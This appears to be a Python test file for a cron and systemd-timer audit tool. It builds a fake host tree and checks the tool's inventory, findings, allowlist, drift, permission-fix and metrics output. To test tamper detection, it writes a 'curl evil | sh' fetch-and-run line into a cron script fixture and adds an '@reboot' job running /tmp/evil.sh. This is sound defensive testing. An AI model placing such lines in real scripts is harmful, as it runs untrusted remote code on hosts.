#!/usr/bin/env python3
"""Offline tests for pft-schedaudit (schedaudit_lib.py + pft-schedaudit.sh) against a fixture host tree built in a
temp dir and a stub systemctl (tests/stub_systemctl.py) answering from captured `systemctl show` output.

Run: TEST_TMPDIR=~/.cache python3 -u schedaudit/tests/test_schedaudit.py   (stdlib only; /tmp is noexec on the hosts,
so the temp dir defaults to ~/.cache). Prints one PASS/FAIL line per check and 'RESULT: PASS|FAIL (n checks)'.
Fixtures: pft-jobwatch, pft-heartbeat, xfs_scrub_all (disabled) and mdmonitor-oneshot (ExecStart path=sh) timers +
services are captured verbatim from the validator (TZ=UTC); pft-satarget (unit not found), pft-samissing (ExecStart
binary missing), pft-sauntracked (unpackaged /usr/local/sbin binary), pft-sauser (User=alice) and pft-samasked are the
pft-jobwatch capture with only the named fields changed. The host tree runs as the test user, so --trusted-uid is the
test user's uid (chain_owner is tested with --trusted-uid 0).
"""

import hashlib
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
SA = os.environ.get("SA_DIR") or os.path.dirname(
    HERE
)  # SA_DIR: a mutant copy (tests/mutate.py)
HELPER = os.path.join(SA, "schedaudit_lib.py")
SCRIPT = os.path.join(SA, "pft-schedaudit.sh")
STUB = os.path.join(HERE, "stub_systemctl.py")
FIX = os.path.join(HERE, "fixtures")
TMP_BASE = os.environ.get("TEST_TMPDIR") or os.path.expanduser("~/.cache")
UID = os.getuid()

results = []


def check(name, cond, detail=""):
    results.append(bool(cond))
    print(
        f"{'PASS' if cond else 'FAIL'} {name}{'' if cond else ' :: ' + str(detail)[:400]}",
        flush=True,
    )


os.makedirs(TMP_BASE, exist_ok=True)
T = tempfile.mkdtemp(prefix="sa-test-", dir=TMP_BASE)
ROOT = os.path.join(T, "root")
STUBD = os.path.join(T, "stub")
LOG = os.path.join(T, "stub.log")
STATE = os.path.join(T, "state")
TEXT = os.path.join(T, "text")


def read(path):
    try:
        with open(path) as fh:
            return fh.read()
    except FileNotFoundError:
        return ""


def w(path, text, mode=0o644):
    p = ROOT + path
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w") as fh:
        fh.write(text)
    os.chmod(p, mode)


UNIT = "[Unit]\n"
SCRIPT_OK = "#!/bin/sh\nexit 0\n"


def md5(text):
    return hashlib.md5(text.encode()).hexdigest()


def build():
    if os.path.exists(ROOT):
        for dp, dn, _fn in os.walk(ROOT):
            for d in dn:
                os.chmod(os.path.join(dp, d), 0o755)
        shutil.rmtree(ROOT)
    os.makedirs(ROOT)
    w(
        "/etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "alice:x:1001:1001:,,,:/home/alice:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
    )
    w("/etc/login.defs", "UID_MIN\t\t\t 1000\nUID_MAX\t\t\t60000\n")
    crontab = (
        "# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\n# Example of job definition:\n"
        "# *  *  *  *  * user-name command to be executed\n"
        "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n"
        "25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n"
        "#5 4 * * * root /usr/local/bin/oldjob --nightly\n"
    )
    w("/etc/crontab", crontab)
    pkgjob = "PATH=/usr/bin:/bin\n0 1 * * * root fakebin --x\n"
    w("/etc/cron.d/pkgjob", pkgjob)
    w("/etc/cron.d/modjob", "0 2 * * * root /usr/sbin/xfs_scrub_all\n")
    w(
        "/etc/cron.d/badperm",
        "0 3 * * * root /usr/local/bin/pft-jobwatch collect\n",
        0o666,
    )
    w("/etc/cron.d/tmpjob", "@reboot root /tmp/evil.sh\n")
    w("/etc/cron.d/userjob", "*/10 * * * * alice /usr/local/bin/pft-heartbeat\n")
    w("/etc/cron.d/opendir", "0 4 * * * root /opt/sajob/run.sh\n")
    w("/opt/sajob/run.sh", "#!/bin/sh\nexit 0\n", 0o755)
    os.chmod(ROOT + "/opt/sajob", 0o777)
    w("/etc/cron.d/old.dpkg-old", "0 5 * * * root /usr/local/bin/pft-jobwatch\n")
    w("/etc/cron.d/.placeholder", "# DO NOT EDIT OR REMOVE\n")
    os.makedirs(ROOT + "/tmp", exist_ok=True)
    os.chmod(ROOT + "/tmp", 0o1777)
    w("/tmp/evil.sh", "#!/bin/sh\nexit 0\n", 0o755)
    w("/etc/cron.hourly/job1", "#!/bin/sh\nexit 0\n", 0o755)
    w("/etc/cron.hourly/.placeholder", "# DO NOT EDIT OR REMOVE\n")
    w("/etc/cron.hourly/notexec", "#!/bin/sh\nexit 0\n", 0o644)
    w("/etc/cron.hourly/x.dpkg-dist", "#!/bin/sh\nexit 0\n", 0o755)
    w("/etc/cron.daily/dpkg", "#!/bin/sh\nexit 0\n", 0o755)
    w("/etc/cron.weekly/wk", "#!/bin/sh\nexit 0\n", 0o755)
    w("/etc/cron.monthly/mo", "#!/bin/sh\nexit 0\n", 0o755)
    w(
        "/etc/anacrontab",
        "SHELL=/bin/sh\n# period delay job-identifier command\n7\t10\tcron.weekly\trun-parts --report /etc/cron.weekly\n"
        "#30\t15\tcron.yearly\trun-parts /etc/cron.yearly\n",
    )
    w(
        "/var/spool/cron/crontabs/alice",
        "# DO NOT EDIT THIS FILE\n*/5 * * * * /home/alice/bin/x\n",
        0o600,
    )
    w("/home/alice/bin/x", "#!/bin/sh\nexit 0\n", 0o755)
    w("/var/spool/cron/atjobs/a0001", "#!/bin/sh\n# atrun uid=0\ntrue\n", 0o700)
    w("/var/spool/cron/atjobs/a0002", "#!/bin/sh\ntrue\n", 0o600)
    w("/var/spool/cron/atjobs/.SEQ", "3\n", 0o600)
    # binaries and units
    for p in (
        "/usr/local/bin/pft-jobwatch",
        "/usr/local/bin/pft-heartbeat",
        "/usr/local/bin/pft-userjob",
        "/usr/local/sbin/pft-untracked",
        "/bin/sh",
    ):
        w(p, "#!/bin/sh\nexit 0\n", 0o755)
    xfs = "#!/bin/sh\n# xfs_scrub_all\nexit 0\n"
    w("/usr/sbin/xfs_scrub_all", xfs, 0o755)
    w("/usr/bin/fakebin", "#!/bin/sh\n# tampered\nexit 0\n", 0o755)
    for f in os.listdir(FIX):
        if not f.endswith(".show"):
            continue
        for ln in read(os.path.join(FIX, f)).splitlines():
            if ln.startswith("FragmentPath=") and ln.strip() != "FragmentPath=":
                w(ln.strip().split("=", 1)[1], UNIT)
    w("/usr/lib/systemd/user/foo.timer", "[Timer]\nOnCalendar=daily\n")
    w("/home/alice/.config/systemd/user/bar.timer", "[Timer]\nOnCalendar=hourly\n")
    # dpkg database
    w(
        "/var/lib/dpkg/info/cron.list",
        "/etc\n/etc/crontab\n/etc/cron.d/pkgjob\n/etc/cron.d/modjob\n/etc/cron.daily/dpkg\n",
    )
    w(
        "/var/lib/dpkg/info/xfsprogs.list",
        "/usr/sbin/xfs_scrub_all\n/lib/systemd/system/xfs_scrub_all.timer\n/lib/systemd/system/xfs_scrub_all.service\n",
    )
    w(
        "/var/lib/dpkg/info/xfsprogs.md5sums",
        f"{md5(xfs)}  usr/sbin/xfs_scrub_all\n{md5(UNIT)}  lib/systemd/system/xfs_scrub_all.timer\n"
        f"{md5(UNIT)}  lib/systemd/system/xfs_scrub_all.service\n",
    )
    w("/var/lib/dpkg/info/wkpkg.list", "/etc/cron.weekly/wk\n")
    w("/var/lib/dpkg/info/fakepkg:amd64.list", "/usr/bin/fakebin\n")
    w(
        "/var/lib/dpkg/info/fakepkg:amd64.md5sums",
        f"{md5('original')}  usr/bin/fakebin\n",
    )
    w(
        "/var/lib/dpkg/status",
        "Package: cron\nStatus: install ok installed\nConffiles:\n"
        f" /etc/crontab {md5(crontab)}\n /etc/cron.d/pkgjob {md5(pkgjob)}\n"
        f" /etc/cron.d/modjob {md5('stock modjob')}\n /etc/cron.d/gone {md5('x')} obsolete\n /etc/cron.daily/dpkg {md5('old')} obsolete\nDescription: cron\n\n"
        f"Package: wkpkg\nStatus: install ok installed\nConffiles:\n /etc/cron.weekly/wk {md5(SCRIPT_OK)}\n\n",
    )


def stub_dir():
    if os.path.exists(STUBD):
        shutil.rmtree(STUBD)
    shutil.copytree(FIX, STUBD)


build()
stub_dir()
os.makedirs(STATE, exist_ok=True)
os.makedirs(TEXT, exist_ok=True)
SYSTEMCTL = f"{sys.executable} {STUB}"
ENV = dict(os.environ, SA_STUB_DIR=STUBD, SA_STUB_LOG=LOG, TZ="UTC")
for k in ("PFT_SA_CONF",):
    ENV.pop(k, None)


def helper(*a, trusted=UID, env=None, state=True, allow=None):
    cmd = [
        sys.executable,
        "-I",
        HELPER,
        *a,
        "--root",
        ROOT,
        "--systemctl",
        SYSTEMCTL,
        "--trusted-uid",
        str(trusted),
    ]
    cmd += ["--now", "1762466400"]
    if state:
        cmd += ["--state", os.path.join(STATE, "state.json")]
    if allow:
        cmd += ["--allow", allow]
    p = subprocess.run(  # noqa: PLW1510 - rc is checked by every caller
        cmd,
        capture_output=True,
        text=True,
        env=env or ENV,
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    return p.returncode, p.stdout, p.stderr


def audit_json(*a, **kw):
    rc, out, err = helper("audit", "--format", "json", *a, **kw)
    try:
        return rc, json.loads(out), err
    except ValueError:
        return rc, None, err + out[:200]


def findings(j):
    return {
        (f["check"], f["path"]): (e["id"], f)
        for e in j["entries"]
        for f in e["findings"]
    }


try:
    # ------------------------------------------------------------- inventory
    rc, out, err = helper("inventory", "--format", "json")
    inv = json.loads(out) if rc == 0 else []
    check("inventory: json rc 0", rc == 0 and inv, (rc, err))
    by = {}
    for e in inv:
        by.setdefault(e["source"], []).append(e)
    files = {(e["file"], e["state"]) for e in inv}
    check(
        "inventory: /etc/crontab 3 entries (2 active + 1 commented), help line skipped",
        [e["state"] for e in by.get("crontab", [])] == ["active", "active", "commented"]
        and not any("user-name" in e["command"] for e in inv),
        by.get("crontab"),
    )
    check(
        "inventory: commented crontab job keeps its command",
        any(
            e["state"] == "commented"
            and e["command"] == "/usr/local/bin/oldjob --nightly"
            for e in inv
        ),
    )
    check(
        "inventory: cron.d name with a dot is inert (cron skips it)",
        ("/etc/cron.d/old.dpkg-old", "inert-name") in files,
    )
    check(
        "inventory: cron.d .placeholder (comments only) has no entry",
        not any(e["file"] == "/etc/cron.d/.placeholder" for e in inv),
    )
    check(
        "inventory: @reboot special parsed",
        any(e["schedule"] == "@reboot" and e["command"] == "/tmp/evil.sh" for e in inv),
    )
    check(
        "inventory: PATH= line is not an entry, job after it is",
        [e["line"] for e in inv if e["file"] == "/etc/cron.d/pkgjob"] == [2],
    )
    rp = {e["file"]: e["state"] for e in by.get("run-parts", [])}
    check(
        "inventory: run-parts states (active / inert-name / not-executable / no-schedule)",
        rp.get("/etc/cron.hourly/job1") == "active"
        and rp.get("/etc/cron.hourly/.placeholder") == "inert-name"
        and rp.get("/etc/cron.hourly/x.dpkg-dist") == "inert-name"
        and rp.get("/etc/cron.hourly/notexec") == "not-executable"
        and rp.get("/etc/cron.monthly/mo") == "no-schedule"
        and rp.get("/etc/cron.daily/dpkg") == "active",
        rp,
    )
    check(
        "inventory: weekly run-parts driven by anacrontab counts as active",
        rp.get("/etc/cron.weekly/wk") == "active",
        rp,
    )
    check(
        "inventory: anacrontab 1 active + 1 commented",
        sorted(e["state"] for e in by.get("anacrontab", [])) == ["active", "commented"],
        by.get("anacrontab"),
    )
    check(
        "inventory: spool crontab entry with its user",
        [(e["user"], e["command"]) for e in by.get("spool", [])]
        == [("alice", "/home/alice/bin/x")],
        by.get("spool"),
    )
    check(
        "inventory: at jobs queued (0700) and done (0600), .SEQ skipped",
        sorted(e["state"] for e in by.get("at", [])) == ["done", "queued"],
        by.get("at"),
    )
    ts = {e["id"].split("@")[0]: e["state"] for e in by.get("timer", [])}
    check(
        "inventory: timers active/disabled/masked, template @.timer skipped",
        ts.get("timer/pft-jobwatch.timer") == "active"
        and ts.get("timer/xfs_scrub_all.timer") == "disabled"
        and ts.get("timer/pft-samasked.timer") == "masked"
        and not any("@." in k for k in ts)
        and len(ts) == 9,
        ts,
    )
    check(
        "inventory: user-unit timer files listed (system-wide + per-user)",
        sorted(e["file"] for e in by.get("user-timer", []))
        == [
            "/home/alice/.config/systemd/user/bar.timer",
            "/usr/lib/systemd/user/foo.timer",
        ],
        by.get("user-timer"),
    )
    mon = [e for e in inv if e["id"].startswith("timer/pft-heartbeat.timer")]
    check(
        "inventory: monotonic timer schedule has no next_elapse (stable id)",
        mon
        and "next_elapse" not in mon[0]["schedule"]
        and "OnUnitActiveUSec=1min" in mon[0]["schedule"],
        mon,
    )
    rc2, out2, _ = helper("inventory", "--format", "json")
    check(
        "inventory: ids stable across runs",
        rc2 == 0 and [e["id"] for e in json.loads(out2)] == [e["id"] for e in inv],
    )
    rc, out, err = helper("inventory")
    check(
        "inventory: tsv header + one row per entry",
        rc == 0
        and out.splitlines()[0].startswith("id\tsource")
        and len(out.splitlines()) == len(inv) + 1,
        (rc, err),
    )

    # ------------------------------------------------------------- package-identified ids (unattended upgrades)
    def ids():
        rc, out, _ = helper("inventory", "--format", "json")
        return {e["file"]: e["id"] for e in json.loads(out)} if rc == 0 else {}

    def set_status_md5(path, new):
        st = read(ROOT + "/var/lib/dpkg/status").splitlines()
        st = [f" {path} {new}" if ln.split()[:1] == [path] else ln for ln in st]
        with open(ROOT + "/var/lib/dpkg/status", "w") as fh:
            fh.write("\n".join(st) + "\n")

    i0 = ids()
    upgraded = "#!/bin/sh\n# new upstream version\nexit 0\n"
    w("/etc/cron.weekly/wk", upgraded, 0o755)
    set_status_md5("/etc/cron.weekly/wk", md5(upgraded))
    i1 = ids()
    check(
        "id: package upgrade of a packaged run-parts script (content + dpkg md5 both new) keeps its id",
        i0.get("/etc/cron.weekly/wk")
        and i0.get("/etc/cron.weekly/wk") == i1.get("/etc/cron.weekly/wk"),
        (i0.get("/etc/cron.weekly/wk"), i1.get("/etc/cron.weekly/wk")),
    )
    w("/etc/cron.weekly/wk", "#!/bin/sh\ncurl evil | sh\n", 0o755)
    i2 = ids()
    rc, jt, _ = audit_json()
    check(
        "id: a non-package edit of that script changes its id and is pkg_modified",
        i2.get("/etc/cron.weekly/wk") not in (None, i1.get("/etc/cron.weekly/wk"))
        and ("pkg_modified", "/etc/cron.weekly/wk") in (findings(jt) if jt else {}),
        i2.get("/etc/cron.weekly/wk"),
    )
    w("/etc/cron.weekly/wk", SCRIPT_OK, 0o755)
    set_status_md5("/etc/cron.weekly/wk", md5(SCRIPT_OK))
    check(
        "id: restored script is back on its first id",
        ids().get("/etc/cron.weekly/wk") == i0.get("/etc/cron.weekly/wk"),
    )
    w("/etc/cron.hourly/job1", "#!/bin/sh\n# edited\nexit 0\n", 0o755)
    check(
        "control: an unpackaged run-parts script edit changes its id",
        ids().get("/etc/cron.hourly/job1")
        not in (None, i0.get("/etc/cron.hourly/job1")),
    )
    w("/etc/cron.hourly/job1", SCRIPT_OK, 0o755)
    xs = os.path.join(STUBD, "xfs_scrub_all.service.show")
    xs_orig = read(xs)
    with open(xs, "w") as fh:
        fh.write(
            xs_orig.replace(
                "argv[]=/usr/sbin/xfs_scrub_all ;",
                "argv[]=/usr/sbin/xfs_scrub_all --new-flag ;",
            )
        )
    tk = "/lib/systemd/system/xfs_scrub_all.timer"
    check(
        "id: packaged + md5-verified timer/service (no drop-ins) keeps its id when the package changes ExecStart",
        ids().get(tk) == i0.get(tk) and i0.get(tk),
        (i0.get(tk), ids().get(tk)),
    )
    w("/lib/systemd/system/xfs_scrub_all.service", "[Unit]\n# local edit\n")
    check(
        "id: a non-package edit of the packaged service file changes the timer id",
        ids().get(tk) not in (None, i0.get(tk)),
    )
    w("/lib/systemd/system/xfs_scrub_all.service", UNIT)
    with open(xs, "w") as fh:
        fh.write(
            xs_orig.replace(
                "DropInPaths=",
                "DropInPaths=/etc/systemd/system/xfs_scrub_all.service.d/override.conf",
            )
        )
    i_drop = ids().get(tk)
    with open(xs, "w") as fh:
        fh.write(
            xs_orig.replace(
                "DropInPaths=",
                "DropInPaths=/etc/systemd/system/xfs_scrub_all.service.d/override.conf",
            ).replace(
                "argv[]=/usr/sbin/xfs_scrub_all ;",
                "argv[]=/usr/sbin/xfs_scrub_all --from-override ;",
            )
        )
    check(
        "id: with a drop-in the packaged timer is content-identified (an override's ExecStart change shows)",
        i_drop not in (None, i0.get(tk)) and ids().get(tk) not in (None, i_drop),
        (i0.get(tk), i_drop, ids().get(tk)),
    )
    with open(xs, "w") as fh:
        fh.write(xs_orig)
    pj = "/etc/systemd/system/pft-jobwatch.timer"
    pjs = os.path.join(STUBD, "pft-jobwatch.service.show")
    pj_orig = read(pjs)
    with open(pjs, "w") as fh:
        fh.write(
            pj_orig.replace(
                "argv[]=/usr/local/bin/pft-jobwatch collect",
                "argv[]=/usr/local/bin/pft-jobwatch evil",
            )
        )
    check(
        "control: an unpackaged timer's ExecStart change changes its id",
        ids().get(pj) not in (None, i0.get(pj)),
    )
    with open(pjs, "w") as fh:
        fh.write(pj_orig)
    check("ids: fixture back to the first inventory", ids() == i0)

    # ------------------------------------------------------------- findings
    rc, j, err = audit_json()
    F = findings(j) if j else {}
    check("audit: rc 1 with findings and no baseline", rc == 1 and j, (rc, err))

    def has(c, p):
        return (c, p) in F

    check(
        "finding: chain_writable on a 0666 cron.d file (fixable)",
        has("chain_writable", "/etc/cron.d/badperm")
        and F[("chain_writable", "/etc/cron.d/badperm")][1]["fixable"],
    )
    check(
        "finding: chain_writable on a 0777 parent dir of a job script",
        has("chain_writable", "/opt/sajob"),
    )
    check(
        "finding: writable_dir for a job under sticky /tmp", has("writable_dir", "/tmp")
    )
    check(
        "finding: writable_dir for a user crontab job under /home",
        has("writable_dir", "/home/alice/bin/x"),
    )
    check(
        "finding: pkg_modified on an edited conffile (status Conffiles md5)",
        has("pkg_modified", "/etc/cron.d/modjob"),
    )
    check(
        "control: unedited conffile and /etc/crontab are not pkg_modified",
        not has("pkg_modified", "/etc/cron.d/pkgjob")
        and not has("pkg_modified", "/etc/crontab"),
    )
    check(
        "finding: pkg_modified on a PATH-resolved bare command (md5sums)",
        has("pkg_modified", "/usr/bin/fakebin"),
    )
    check(
        "control: matching md5sums binary not flagged",
        not has("pkg_modified", "/usr/sbin/xfs_scrub_all")
        and not has("untracked", "/usr/sbin/xfs_scrub_all"),
    )
    check(
        "finding: untracked unpackaged timer binary in /usr/local/sbin",
        has("untracked", "/usr/local/sbin/pft-untracked"),
    )
    check(
        "control: /usr/local/bin and pft-* units count as integrity-tracked",
        not has("untracked", "/usr/local/bin/pft-jobwatch")
        and not has("untracked", "/etc/systemd/system/pft-jobwatch.timer"),
    )
    check(
        "finding: nonsystem_user for a cron.d job as alice",
        has("nonsystem_user", "/etc/cron.d/userjob"),
    )
    check(
        "finding: nonsystem_user for the user crontab",
        has("nonsystem_user", "/var/spool/cron/crontabs/alice"),
    )
    check(
        "finding: nonsystem_user for a timer with User=alice",
        has("nonsystem_user", "/etc/systemd/system/pft-sauser.timer"),
    )
    check(
        "finding: timer_target for a timer whose unit is not found (detail names not-found)",
        has("timer_target", "/etc/systemd/system/pft-satarget.timer")
        and "not-found"
        in F[("timer_target", "/etc/systemd/system/pft-satarget.timer")][1]["detail"],
    )
    check(
        "control: obsolete conffile md5 is ignored (packaged run-parts script with a stale obsolete hash)",
        not has("pkg_modified", "/etc/cron.daily/dpkg"),
    )
    check(
        "finding: timer_target for a missing ExecStart binary",
        has("timer_target", "/usr/local/sbin/pft-gone"),
    )
    check(
        "control: ExecStart path=sh resolves through the systemd PATH (no timer_target)",
        not any(
            c == "timer_target" and "mdmonitor" in i for (c, _p), (i, _f) in F.items()
        ),
    )
    check(
        "control: inert/done entries carry no findings",
        all(
            not e["findings"]
            for e in j["entries"]
            if e["state"] in ("inert-name", "done")
        ),
    )
    check(
        "control: no chain_owner when every file is owned by the trusted uid",
        not any(c == "chain_owner" for c, _ in F),
    )
    check(
        "control: user crontab owned by its user is not chain_owner (trusted 0 run checked below)",
        True,
    )
    rc, j0, _ = audit_json(trusted=0)
    F0 = findings(j0) if j0 else {}
    check(
        "finding: chain_owner with --trusted-uid 0 (fixture owned by the test user)",
        ("chain_owner", "/etc/cron.d/badperm") in F0 and ("chain_owner", "/") in F0,
    )
    check(
        "control: user crontab file itself never chain_owner (owned by its user by design)",
        ("chain_owner", "/var/spool/cron/crontabs/alice") not in F0,
    )
    rc, jh, _ = audit_json("--integrity-hook")
    FH = findings(jh) if jh else {}
    check(
        "integrity hook: untracked clears when pft-integrity tracks the scope",
        not any(c == "untracked" for c, _ in FH)
        and any(c == "untracked" for c, _ in F),
        [p for c, p in FH if c == "untracked"],
    )
    rc, out, _ = helper("scope", state=False)
    sc = out.split()
    check(
        "scope: lists unpackaged job files + scheduling dirs, not packaged binaries or /tmp",
        rc == 0
        and "/usr/local/sbin/pft-untracked" in sc
        and "/etc/cron.d/badperm" in sc
        and "/etc/cron.d" in sc
        and "/etc/cron.hourly" in sc
        and "/var/spool/cron/crontabs" in sc
        and "/usr/sbin/xfs_scrub_all" not in sc
        and "/tmp/evil.sh" not in sc
        and "/usr/local/bin/pft-jobwatch" not in sc,
        sc,
    )
    check(
        "scope: packaged /etc conffiles are still tracked (they can be edited)",
        "/etc/cron.d/modjob" in sc,
        sc,
    )

    sys.path.insert(0, SA)
    import schedaudit_lib as sl

    check(
        "unexpected: no baseline alone makes the audit unexpected (rc 1)",
        sl.is_unexpected({"unallowed": [], "new": [], "removed": [], "baseline": False})
        and not sl.is_unexpected(
            {"unallowed": [], "new": [], "removed": [], "baseline": True}
        ),
    )

    # ------------------------------------------------------------- allowlist
    al = os.path.join(T, "allow")
    with open(al, "w") as fh:
        fh.write("nonsystem_user cron.d/userjob@* /etc/cron.d/userjob\n")
    rc, out, err = helper("audit", allow=al)
    check(
        "allowlist: line without a reason refused (rc 3)",
        rc == 3 and "REASON" in err,
        (rc, err),
    )
    with open(al, "w") as fh:
        fh.write("bogus_check * * some reason text\n")
    rc, out, err = helper("audit", allow=al)
    check(
        "allowlist: unknown check refused (rc 3)",
        rc == 3 and "unknown check" in err,
        (rc, err),
    )
    with open(al, "w") as fh:
        fh.write("nonsystem_user * * ok\n")
    rc, out, err = helper("audit", allow=al)
    check(
        "allowlist: too-short reason refused (rc 3)",
        rc == 3 and "too short" in err,
        (rc, err),
    )
    with open(al, "w") as fh:
        fh.write(
            "# comment\nnonsystem_user cron.d/userjob@* /etc/cron.d/userjob operator heartbeat test job as alice\n"
            "chain_writable cron.d/nothing@* * stale exception nobody needs\n"
            "nonsystem_user timer/pft-sauser.timer@* /wrong/path/* entry matches but the path glob does not\n"
        )
    rc, j, err = audit_json(allow=al)
    FA = findings(j) if j else {}
    check(
        "allowlist: matching finding marked allowed with its reason",
        FA.get(("nonsystem_user", "/etc/cron.d/userjob"), (0, {}))[1].get("allowed")
        == "operator heartbeat test job as alice",
    )
    check(
        "allowlist: entry glob matching but path glob not -> not allowed",
        not FA.get(
            ("nonsystem_user", "/etc/systemd/system/pft-sauser.timer"),
            (0, {"allowed": "x"}),
        )[1]["allowed"],
    )
    check(
        "allowlist: other nonsystem_user findings not allowed",
        not FA.get(
            ("nonsystem_user", "/var/spool/cron/crontabs/alice"), (0, {"allowed": "x"})
        )[1]["allowed"],
    )
    check(
        "allowlist: unused line counted",
        j and j["summary"]["unused_allow"] == 2,
        j and j["summary"],
    )
    rc, out, _ = helper("audit", allow=al)
    check(
        "allowlist: tsv shows ALLOWED row with reason and the unused line",
        "ALLOWED\tnonsystem_user\tcron.d/userjob@" in out
        and "unused: chain_writable" in out,
        out[-600:],
    )

    # ------------------------------------------------------------- accept / drift
    rc, out, err = helper("accept", "--reason", "short")
    check("accept: reason under 8 chars refused", rc == 3, (rc, err))
    rc, out, err = helper("accept", "--reason", "fixture baseline for tests")
    check(
        "accept: writes state 0600",
        rc == 0
        and stat.S_IMODE(os.stat(os.path.join(STATE, "state.json")).st_mode) == 0o600,
        (rc, err),
    )
    rc, j, _ = audit_json()
    check(
        "drift: none right after accept",
        j and not j["new"] and not j["removed"],
        j and (j["new"], j["removed"]),
    )
    w("/etc/cron.d/drill", "0 0 30 2 * root /bin/true\n")
    rc, j, _ = audit_json()
    check(
        "drift: added cron.d file -> exactly 1 new entry (Feb 30: never fires)",
        j
        and len(j["new"]) == 1
        and j["new"][0].startswith("cron.d/drill@")
        and not j["removed"],
        j and j["new"],
    )
    w("/etc/cron.d/opendir", "0 5 * * * root /opt/sajob/run.sh\n")
    rc, j, _ = audit_json()
    check(
        "drift: edited line -> 1 new + 1 removed for that file",
        j
        and sum(1 for i in j["new"] if i.startswith("cron.d/opendir@")) == 1
        and [i for i in j["removed"] if i.startswith("cron.d/opendir@")],
        j and (j["new"], j["removed"]),
    )
    os.remove(ROOT + "/etc/cron.d/drill")
    w("/etc/cron.d/opendir", "0 4 * * * root /opt/sajob/run.sh\n")
    rc, j, _ = audit_json()
    check(
        "drift: back to the accepted set after removal/revert",
        j and not j["new"] and not j["removed"],
    )
    os.chmod(ROOT + "/etc/cron.hourly/job1", 0o644)
    rc, j, _ = audit_json()
    check(
        "drift: run-parts script losing +x stays the same id (state not-executable)",
        j
        and not j["new"]
        and any(
            e["file"] == "/etc/cron.hourly/job1" and e["state"] == "not-executable"
            for e in j["entries"]
        ),
    )
    os.chmod(ROOT + "/etc/cron.hourly/job1", 0o755)
    with open(os.path.join(STATE, "state.json"), "w") as fh:
        fh.write("[1, 2]\n")
    rc, out, err = helper("audit")
    check(
        "state: wrong-typed state file refused (rc 3), not read as empty",
        rc == 3,
        (rc, err),
    )
    with open(os.path.join(STATE, "state.json"), "w") as fh:
        fh.write("{not json\n")
    rc, out, err = helper("audit")
    check("state: corrupt state file refused (rc 3)", rc == 3, (rc, err))
    os.remove(os.path.join(STATE, "state.json"))

    # ------------------------------------------------------------- apply
    def snapshot():
        out = {}
        for dp, _dn, fn in os.walk(ROOT):
            for f in fn:
                p = os.path.join(dp, f)
                with open(p, "rb") as fh:
                    out[p] = hashlib.sha256(fh.read()).hexdigest()
        return out

    before = snapshot()
    rc, out, err = helper("apply", "--dry-run")
    check(
        "apply --dry-run: plans chmod for both chain_writable paths, changes nothing",
        rc == 0
        and "PLAN\t/etc/cron.d/badperm\t0666 -> 0644" in out
        and "PLAN\t/opt/sajob\t0777 -> 0755" in out
        and stat.S_IMODE(os.stat(ROOT + "/etc/cron.d/badperm").st_mode) == 0o666,
        (rc, out, err),
    )
    rc, out, err = helper("apply")
    check(
        "apply: FIXED lines + RESULT remaining 0",
        rc == 0
        and "FIXED\t/etc/cron.d/badperm\t0666 -> 0644" in out
        and "FIXED\t/opt/sajob\t0777 -> 0755" in out
        and "remaining_fixable=0" in out,
        (rc, out, err),
    )
    check(
        "apply: modes really changed",
        stat.S_IMODE(os.stat(ROOT + "/etc/cron.d/badperm").st_mode) == 0o644
        and stat.S_IMODE(os.stat(ROOT + "/opt/sajob").st_mode) == 0o755,
    )
    check(
        "apply: no file content changed, nothing created or removed",
        snapshot() == before,
    )
    check(
        "apply: never touches sticky /tmp (writable_dir is not permissions-fixable)",
        stat.S_IMODE(os.stat(ROOT + "/tmp").st_mode) == 0o1777,
    )
    rc, j, _ = audit_json()
    check(
        "apply: re-audit has no chain_writable",
        j and not any(c == "chain_writable" for c, _ in findings(j)),
    )
    os.chmod(ROOT + "/etc/cron.d/badperm", 0o666)
    rc, out, err = helper("apply", trusted=0)
    check(
        "apply: path owned by a non-trusted uid is SKIPped (owner is not a permissions fix)",
        "SKIP\t/etc/cron.d/badperm\towner uid" in out
        and stat.S_IMODE(os.stat(ROOT + "/etc/cron.d/badperm").st_mode) == 0o666,
        (rc, out, err),
    )

    # ------------------------------------------------------------- prom
    rc, out, err = helper("prom", "--host", "validator")
    check(
        "prom: up 1, timestamp, rc 1 (unaccepted)",
        rc == 1
        and 'pft_schedaudit_up{host="validator"} 1' in out
        and 'pft_schedaudit_collect_timestamp_seconds{host="validator"} 1762466400'
        in out,
        (rc, err),
    )
    check(
        "prom: chain_writable crit count 1 (badperm re-opened)",
        'pft_schedaudit_findings{host="validator",check="chain_writable",severity="crit",allowed="0"} 1'
        in out,
        out[:300],
    )
    check(
        "prom: every check has allowed 0/1 series (no missing series for rules)",
        all(
            f'check="{c}"' in out
            for c in (
                "chain_owner",
                "writable_dir",
                "pkg_modified",
                "untracked",
                "nonsystem_user",
                "timer_target",
            )
        )
        and out.count("pft_schedaudit_findings{") == 14,
    )
    check(
        "prom: unexpected kinds new/removed/finding/unaccepted",
        all(
            f'pft_schedaudit_unexpected{{host="validator",kind="{k}"}}' in out
            for k in ("new", "removed", "finding", "unaccepted")
        )
        and 'kind="unaccepted"} 1' in out,
    )
    check(
        "prom: entries by source/state",
        'pft_schedaudit_entries{host="validator",source="timer",state="masked"} 1'
        in out,
    )
    rc, out, err = helper(
        "prom", "--host", "validator", env=dict(ENV, SA_STUB_FAIL="1")
    )
    check(
        "prom: systemctl failure -> up 0 only, rc 2",
        rc == 2
        and 'pft_schedaudit_up{host="validator"} 0' in out
        and "pft_schedaudit_findings" not in out,
        (rc, out, err),
    )
    verbs = {ln.split()[0] for ln in read(LOG).splitlines() if ln.strip()}
    check(
        "stub: only list-unit-files/list-units/show were ever run",
        verbs == {"list-unit-files", "list-units", "show"},
        verbs,
    )

    # ------------------------------------------------------------- pft-integrity hook (../integrity collect_sched)
    INTEG_SRC = os.environ.get("SA_INTEGRITY") or os.path.join(
        os.path.dirname(os.path.dirname(HERE)), "integrity", "pft-integrity.sh"
    )
    src = read(INTEG_SRC).splitlines()

    def func(name):
